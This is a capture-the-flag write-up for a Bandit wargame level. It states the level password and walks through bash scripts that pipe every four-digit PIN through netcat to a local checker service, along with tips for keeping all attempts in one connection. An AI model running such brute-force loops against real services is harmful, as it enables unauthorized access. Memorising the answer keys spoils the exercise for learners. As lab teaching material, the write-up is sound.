Level password: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

From testing:

```sh
echo -e "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G80\ngb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1" | nc localhost 30002

I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
```

It seems that the server that checks for the password can handle multiple inputs per 1 connection. So we could brute-force this using a bash script that sends all the password in 1 connection session and invert grep for the word "Wrong".

We could create a script for this:

```sh
#!/bin/bash

for i in {0..9999};
do
	echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 ${i}";
done | nc localhost 30002 | grep -v "Wrong"
```

We iterate from *0* to *9999* using a for loop, then echo the password of the current level with the current iteration index. Then we pipe it into `netcat`. The invert grep `grep -v` allows us to filter for any output that doesn't contain the word *Wrong* in it, the word that indicates incorrect password. So we just grab output lines that are correct.

We could also use `seq` for this:

```sh
#!/bin/bash

for i in $(seq 0 9999);
do
	echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 ${i}";
done | nc localhost 30002 | grep -v "Wrong"
```

Note: The below script should theoretically work:
```sh
#!/bin/bash

for i in {0..9999};
do
	echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 ${i}" | nc localhost 30002 | grep -v "Wrong";
done
```

However, the problem lies in the server not handling the connection opening and closing quickly. It could also overwhelm the server and cause timeout. 